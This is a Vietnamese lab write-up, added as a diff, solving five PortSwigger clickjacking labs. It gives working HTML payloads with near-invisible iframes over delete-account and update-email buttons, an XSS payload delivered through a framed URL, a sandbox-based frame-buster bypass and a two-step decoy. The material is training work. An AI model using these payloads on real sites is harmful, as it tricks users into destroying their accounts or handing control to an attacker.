@@ -1,0 +1,254 @@
+---
+title: "Clickjacking Labs — PortSwigger Web Security Academy"
+description: "Writeup 5 bài lab Clickjacking trên PortSwigger: Basic with CSRF token, Prefilled form input, DOM-based XSS, Frame buster bypass, và Multistep clickjacking."
+date: "2026-04-24"
+category: "writeup"
+tags: ["clickjacking", "portswigger", "iframe", "xss", "csrf", "burp-suite"]
+thumbnail: ""
+external_link: "https://portswigger.net/web-security/clickjacking"
+---
+
+## Lab 1: Basic Clickjacking with CSRF Token Protection
+
+Trang web cho phép ta đăng nhập, thêm gmail, và nó chứa một chức năng nhạy cảm đó là xoá tài khoản của chính người đang đăng nhập.
+
+![Giao diện trang web mục tiêu](/images/writeups/clickjacking-labs/image1.png)
+
+Chuyển tới **exploit-server**, nơi ta có thể thực hiện khai thác. Lợi dụng lỗi **Clickjacking**, vì trang web cho ta nhúng thẻ iframe nên ta tạo một đoạn iframe để test, với nội dung là trang web mục tiêu.
+
+![Tạo iframe trên exploit server](/images/writeups/clickjacking-labs/image2.png)
+
+Kết quả sau khi nạn nhân nhấp vào link ta gửi, một frame nhỏ mang thông tin của trang web nạn nhân đã xuất hiện:
+
+![Iframe hiển thị trang web nạn nhân](/images/writeups/clickjacking-labs/image3.png)
+
+Từ đó ta xây dựng payload hoàn thiện, mục tiêu là chèn một button "Click me" vào chỗ xoá tài khoản để dụ nạn nhân click vào.
+
+**Payload:**
+
+```html
+<style>
+    .decoy-text {
+        position: absolute;
+        top: 570px;
+        left: 450px;
+        z-index: 1;
+    }
+    iframe {
+        position: relative;
+        width: 100%;
+        height: 1200px;
+        opacity: 0.5;
+        z-index: 2;
+    }
+</style>
+<div class="decoy-text">Click de nhan 1 ti</div>
+<iframe src="https://TARGET.web-security-academy.net/my-account"></iframe>
+```
+
+![Payload trên exploit server](/images/writeups/clickjacking-labs/image4.png)
+
+Kết quả sau khi render:
+
+![Kết quả render với opacity 0.5](/images/writeups/clickjacking-labs/image5.png)
+
+Chỉnh độ mờ (`opacity` về `0.000001`) để trang web gần như "tàng hình". Khi đó, nạn nhân chỉ thấy dòng chữ chỉ định đã nằm đè lên nút xoá tài khoản, nếu họ click — khai thác thành công!
+
+![Khai thác thành công với opacity gần bằng 0](/images/writeups/clickjacking-labs/image6.png)
+
+---
+
+## Lab 2: Clickjacking with Form Input Data Prefilled from a URL Parameter
+
+Ở bài lab này, ứng dụng cho phép ta cập nhật gmail. Mục tiêu là đổi được gmail nạn nhân.
+
+Tận dụng lỗi **Clickjacking**, ta thực hiện chèn một iframe button "Click me" lên nút "Update email" của nạn nhân.
+
+![Tạo iframe overlay lên nút Update email](/images/writeups/clickjacking-labs/image7.png)
+
+Nhưng làm thế nào để chỉ định tên mail mà ta muốn nạn nhân update? Để ý trên URL, ta có một parameter `email`, cho phép thay đổi gmail của người dùng:
+
+![Parameter email trên URL](/images/writeups/clickjacking-labs/image8.png)
+
+Từ đó, ta có thể điều chỉnh payload, hướng tới URL này:
+
+```html
+<style>
+    .decoy-text {
+        position: absolute;
+        top: 1000px;
+        left: 208px;
+        z-index: 1;
+    }
+    iframe {
+        position: relative;
+        width: 100%;
+        height: 1200px;
+        opacity: 0.5;
+        z-index: 2;
+    }
+</style>
+<div class="decoy-text">Click me</div>
+<iframe src="https://TARGET.web-security-academy.net/my-account?email=duongNT@gmail.com"></iframe>
+```
+
+![Kết quả render với email prefilled](/images/writeups/clickjacking-labs/image9.png)
+
+Chỉnh `opacity` về `0.000001`, ta sẽ khai thác thành công!
+
+---
+
+## Lab 3: Exploiting Clickjacking to Trigger DOM-based XSS
+
+Mục tiêu của bài lab này là khiến cho nạn nhân click vào **Submit feedback** bằng cách sử dụng khai thác **Clickjacking**.
+
+![Form feedback trên trang web](/images/writeups/clickjacking-labs/image10.png)
+
+Thực hiện test xem form có bị XSS không bằng payload `<script>alert('XSS')</script>` — không có pop up hiện về! Sau khi đổi payload thành `<img src=x onerror=alert(1)>` thì trang web mới hiện pop up, từ đó cho thấy dev đã **Filter** không an toàn tại trường **name**!
+
+![Phát hiện lỗ hổng XSS tại trường name](/images/writeups/clickjacking-labs/image11.png)
+
+Sử dụng Burp, ta thấy trang web không hỗ trợ GET Request, vậy ta không thể khai thác bằng payload như các challenge trước.
+
+![Burp Suite hiển thị POST request](/images/writeups/clickjacking-labs/image12.png)
+
+Vậy liệu có cách nào có thể tìm ra GET request hợp lệ không? Ta kiểm tra inspect thì thấy tên các biến nhập liệu:
+
+![Inspect hiển thị các input name](/images/writeups/clickjacking-labs/image13.png)
+
+Ta thử thêm parameter `email` vào URL để test xem web cho đổ dữ liệu bằng GET không:
+
+![Test prefill data qua GET parameter](/images/writeups/clickjacking-labs/image14.png)
+
+Thành công! Vậy là các trường đều có thể được chèn dữ liệu qua GET. Từ đây ta viết payload khai thác lỗi XSS (kích hoạt hàm `print()`) bằng iframe trên URL sử dụng unsafe parameter `name`:
+
+```html
+<style>
+    .decoy-text {
+        position: absolute;
+        top: 600px;
+        left: 208px;
+        z-index: 1;
+    }
+    iframe {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        z-index: 2;
+    }
+</style>
+<div class="decoy-text">Click me</div>
+<iframe src="https://TARGET.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&&email=duong@gmail.com&&subject=a&&message=b"></iframe>
+```
+
+![Kết quả payload XSS qua clickjacking](/images/writeups/clickjacking-labs/image15.png)
+
+Chỉnh `opacity` về `0.000001`, ta sẽ khai thác thành công!
+
+---
+
+## Lab 4: Clickjacking with a Frame Buster Script
+
+Ở lab này, trang web đang có sử dụng bộ lọc chống nhúng (frame buster) ngăn không cho trang web bị nhúng vào frame.
+
+![Trang web với frame buster protection](/images/writeups/clickjacking-labs/image16.png)
+
+Ở đây, dev đã sử dụng **Frame Busting Script** để bảo vệ trang web của người dùng:
+
+```javascript
+if (top !== self) {
+    // Kiểm tra xem trang web hiện tại có phải top hay không.
+    // Khi một trang web không bị nhúng iframe, nó mặc định
+    // được phân hạng cao nhất: TOP.
+    // Nếu điều kiện sai → trang web đang bị nhốt trong iframe!
+    top.location = self.location;
+    // Ép cửa sổ cao nhất (top) phải chuyển hướng về đúng
+    // địa chỉ của trang web của người dùng (self).
+}
+```
+
+Tuy nhiên, đoạn script này dễ dàng bị vô hiệu hoá bởi **`sandbox="allow-forms"`**, một attribute của HTML5 giúp loại bỏ hoàn toàn các tác động của JS lên iframe của attacker.
+
+Ta thực hiện tạo payload và đính kèm attribute trên:
+
+```html
+<style>
+    .decoy-text {
+        position: absolute;
+        top: 487px;
+        left: 230px;
+        z-index: 1;
+    }
+    iframe {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        z-index: 2;
+    }
+</style>
+<div class="decoy-text">Click me</div>
+<iframe sandbox="allow-forms"
+        src="https://TARGET.web-security-academy.net/my-account?email=tttt@gggg">
+</iframe>
+```
+
+![Bypass frame buster thành công với sandbox](/images/writeups/clickjacking-labs/image17.png)
+
+<Alert type="important">
+Thuộc tính `sandbox="allow-forms"` cho phép form bên trong iframe vẫn hoạt động, nhưng **chặn hoàn toàn JavaScript** — khiến frame busting script bị vô hiệu hóa.
+</Alert>
+
+---
+
+## Lab 5: Multistep Clickjacking
+
+Ở thử thách này, trang web cho phép người dùng xoá tài khoản của chính họ, nhưng có thêm **double check** — tức là cần 2 lần click xác nhận.
+
+![Nút Delete account](/images/writeups/clickjacking-labs/image18.png)
+
+![Popup xác nhận xoá tài khoản](/images/writeups/clickjacking-labs/image19.png)
+
+Vì thế, ta cần sử dụng **2 frame** đại diện cho 2 thao tác của người dùng:
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    .firstClick, .secondClick {
+        position: absolute;
+        z-index: 1;
+    }
+    /* Thao tác 1: Click nút "Delete account" */
+    .firstClick {
+        top: 570px;
+        left: 200px;
+    }
+    /* Thao tác 2: Click nút "Confirm" */
+    .secondClick {
+        top: 340px;
+        left: 350px;
+    }
+</style>
+
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+
+<iframe src="https://TARGET.web-security-academy.net/my-account"></iframe>
+```
+
+![Payload multistep với 2 decoy buttons](/images/writeups/clickjacking-labs/image20.png)
+
+![Kết quả render multistep clickjacking](/images/writeups/clickjacking-labs/image21.png)
+
+Chỉnh `opacity` = `0.000001`, ta sẽ hoàn thành được challenge này!
+
+<Alert type="tip">
+Kỹ thuật multistep đòi hỏi căn chỉnh vị trí cực kỳ chính xác cho **từng bước**. Hãy dùng `opacity: 0.5` để căn chỉnh trước, sau đó mới chuyển về `0.000001` khi deploy payload thật.
+</Alert>
